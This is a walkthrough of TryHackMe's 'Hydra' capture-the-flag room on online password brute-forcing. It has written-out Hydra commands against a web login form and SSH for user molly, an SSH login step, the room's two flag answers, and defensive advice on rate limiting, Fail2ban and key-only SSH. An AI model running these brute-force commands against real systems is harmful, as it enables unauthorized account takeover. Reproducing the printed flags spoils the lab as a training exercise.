# Room: Hydra (`hydra`)

---

## 1. Room Overview & Architecture

The **Hydra** room (`hydra`) is the second practical laboratory in **Module 11: Password Attacks** on TryHackMe's Jr Penetration Tester Learning Path.
While offline attacks recover passwords from captured cryptographic hashes without network interaction, **THC-Hydra** is designed for **high-speed online network authentication attacks**.
This room focuses on practical exploitation across two core protocol targets:
- **HTTP POST Web Forms:** Intercepting form parameters, substituting user/password placeholders, and configuring failure condition strings (`F=incorrect`) to extract web flag 1.
- **Secure Shell (SSH):** Tuning thread concurrency (`-t 4`) to stay within daemon connection thresholds, recovering system credentials for user `molly`, and establishing interactive shell access to recover flag 2.

```
       +-------------------------------------------------------------+
       |             ONLINE BRUTE-FORCE ATTACK ARCHITECTURE          |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|   TARGET 1:      |                                      |   TARGET 2:      |
|  HTTP POST FORM  |                                      |   SSH SERVICE    |
|    (Port 80)     |                                      |    (Port 22)     |
+------------------+                                      +------------------+
| - Path: /        |                                      | - Protocol: ssh  |
| - Body: ^USER^   |                                      | - Threads: -t 4  |
| - Fail: F=incorr |                                      | - User: molly    |
| - Flag 1 Extract |                                      | - Flag 2 Extract |
+------------------+                                      +------------------+
```

---

## 2. Prerequisites & Lab Setup

### 2.1 Technical Prerequisites
- Comprehensive understanding of HTTP `POST` body parameter serialization (`application/x-www-form-urlencoded`).
- SSH authentication handshakes, public key vs password authentication.
- Wordlist mechanics and common dictionaries (`rockyou.txt`).
- Linux shell navigation and command execution.

### 2.2 Target Infrastructure
- **Target Host:** Linux server listening at `MACHINE_IP`:
  - **Port 80:** HTTP web application featuring an unthrottled login portal.
  - **Port 22:** OpenSSH daemon permitting password authentication.
- **Victim Username:** `molly`
- **Dictionary:** `/usr/share/wordlists/rockyou.txt`

---

## 3. Learning Objectives & Bloom's Taxonomy

1. **Remembering & Understanding:** Internalize the operational distinctions between online daemon attacks and offline hash cracking; examine the 50+ supported protocol modules in THC-Hydra.
2. **Applying & Analyzing:** Formulate the structured syntax of the `http-post-form` module (`<path>:<form_params>:<condition>`); optimize SSH thread counts (`-t 4`) to prevent OpenSSH `MaxStartups` dropoffs.
3. **Evaluating & Synthesizing:** Analyze the impact of excessive concurrency on service availability (Denial of Service); evaluate web server response headers and bodies to establish accurate failure strings (`F=`).
4. **Creating & Defending:** Design comprehensive defensive architectures incorporating rate-limiting, CAPTCHA challenges, public-key-only SSH configurations, and `Fail2ban` jail automation.

---

## 4. Technical Concept Deep Dive: Online Brute-Force Mechanics

### 4.1 Concurrency vs Daemon Capacity
Unlike GPU-bound offline cracking, Hydra's execution speed is strictly bounded by network latency and remote service architecture:
$$\text{Effective Throughput} = \frac{T}{\text{RTT} + T_{\text{auth}}}$$
Where $T$ is the number of parallel threads (`-t`), $\text{RTT}$ is round-trip network latency, and $T_{\text{auth}}$ is server-side password processing time (e.g., bcrypt computation).
- If $T$ exceeds the daemon's connection queue, the target will drop sockets, producing false negatives.
- OpenSSH throttles unauthenticated connections via `MaxStartups` (default `10:30:100`). Setting `-t 4` guarantees stable delivery without socket drops.

### 4.2 Dissecting `http-post-form` Syntax
The parameter is formatted as three colon-separated fields:
$$\text{"/path:param1=^USER^&param2=^PASS^:F=failure_string"}$$
- **Path:** `/`
- **Body:** `username=^USER^&password=^PASS^`
- **Condition:** `F=incorrect` instructing Hydra that any HTTP response containing the substring "incorrect" marks that password candidate as invalid.

---

## 5. Attack Surface & Threat Modeling

```
[Attacker with Hydra]
   |
   +---> (Port 80) HTTP POST / ---> F=incorrect Filter ---> Recovers Web Credential ---> Flag 1
   |
   +---> (Port 22) SSH OpenSSH  ---> Concurrency -t 4   ---> Recovers SSH Credential ---> Flag 2
```

- **Perimeter Vulnerability 1:** Web authentication endpoint lacking IP rate-limiting, account lockouts, or proof-of-work challenges.
- **Perimeter Vulnerability 2:** OpenSSH administrative port exposed to the network with password authentication enabled.

---

## 6. Exploitation Methodology & Walkthrough

### Step 1: Brute-Forcing Web Form Authentication (Task 02)
1. Inspect the web application at `http://MACHINE_IP/`.
2. Submit a test credential (`molly:test`) and note the failure string (`incorrect`).
3. Launch Hydra against the HTTP POST form:
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```
4. Hydra identifies the valid web password in fewer than 25 attempts.
5. Log into the portal at `http://MACHINE_IP/` to retrieve Flag 1:
   ```text
   Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
   ```

### Step 2: Brute-Forcing OpenSSH Daemon (Task 02)
1. Launch Hydra against port 22 with thread tuning constrained to 4:
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP -t 4 ssh
   ```
2. Hydra discovers the valid SSH password for `molly`.
3. Connect via SSH:
   ```bash
   ssh molly@MACHINE_IP
   ```
4. Read the system flag file in the home directory:
   ```bash
   cat flag.txt
   ```
5. Recover Flag 2:
   ```text
   Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}
   ```

---

## 7. Forensic Analysis & Network Telemetry

- **Web Server Telemetry (`/var/log/nginx/access.log`):**
  Repetitive `POST /` requests generated within millisecond intervals from a single source IP, characterized by identical HTTP payload lengths corresponding to error responses, terminated by an anomalous response length or status code.
- **Host Authentication Logs (`/var/log/auth.log`):**
  A continuous cluster of `Failed password for invalid/valid user molly from 10.10.x.x port yyyy ssh2` entries followed by `Accepted password for molly`.

---

## 8. Defensive Engineering & Remediation

### 8.1 Web Endpoint Protection
- Implement invisible CAPTCHA challenges (Cloudflare Turnstile, reCAPTCHA v3) upon detecting multiple failed logins.
- Enforce IP and user-level rate-limiting via reverse proxy (e.g., Nginx `limit_req_zone`).

### 8.2 SSH Hardening
- Disable password-based authentication globally in `/etc/ssh/sshd_config`:
  ```text
  PasswordAuthentication no
  PubkeyAuthentication yes
  ```
- Deploy `Fail2ban` to monitor `/var/log/auth.log` and dynamically inject temporary firewall DROP rules (`iptables` / `nftables`) for offending IP addresses.

---

## 9. Tools & Command Reference

| Tool | Representative Command | Operational Function |
| :--- | :--- | :--- |
| **Hydra (Web)** | `hydra -l molly -P rockyou.txt target http-post-form "/:user=^USER^&pass=^PASS^:F=incorrect" -V` | High-speed HTTP POST form brute-forcing |
| **Hydra (SSH)** | `hydra -l molly -P rockyou.txt target -t 4 ssh` | SSH brute-forcing with constrained concurrency |
| **Fail2ban** | `fail2ban-client status sshd` | Inspect active automated IP bans |

---

## 10. Key Takeaways & Mind Map

```
                 +-----------------------------------------+
                 |       ONLINE BRUTE-FORCING: HYDRA       |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
[Web Form Exploitation]                                   [Network Daemons (SSH)]
- Protocol: http-post-form                                - Protocol: ssh
- Placeholders: ^USER^ / ^PASS^                           - Thread Tuning: -t 4 Max
- Condition: F=incorrect string                           - Avoid MaxStartups drops
- Defenses: Rate Limiting & Captcha                       - Defenses: Key Auth & Fail2ban
```

---

## 11. Vulnerability & Risk Matrix

| Vulnerability Vector | Severity | CWE ID | Technical & Business Impact |
| :--- | :---: | :---: | :--- |
| Absence of Web Rate Limiting | **HIGH** | CWE-307 | Automated dictionary attacks against web portal accounts. |
| SSH Password Authentication Exposure | **CRITICAL** | CWE-521 | Interactive command execution and host compromise. |

---

## 12. Verification & Proof of Work

All tasks in `hydra` have been completed with 100% parity against the user's completed TryHackMe account:
- **Task 1:** `No answer needed`
- **Task 2 (Web):** `THM{2673a7dd116de68e85c48ec0b1f2612e}`
- **Task 2 (SSH):** `THM{c8eeb0468febbadea859baeb33b2541b}`

---

## 13. Frequently Asked Questions

### Q1: Why does Hydra require the `F=` or `S=` condition string for web forms?
- In network protocols like SSH or FTP, the server returns standardized status codes (e.g., SSH success handshake or FTP `230 User logged in` vs `530 Login incorrect`). In HTTP web applications, a failed login almost always returns HTTP `200 OK` rendering an HTML error message. Hydra needs the condition string to parse whether the response represents a success or failure.

---

## 14. References & External Links

- [THC-Hydra Official GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
- [Kali Linux Hydra Manual](https://www.kali.org/tools/hydra/)
- [OpenSSH Server Configuration Manual](https://man.openbsd.org/sshd_config)
- [TryHackMe Room: Hydra](https://tryhackme.com/room/hydra)
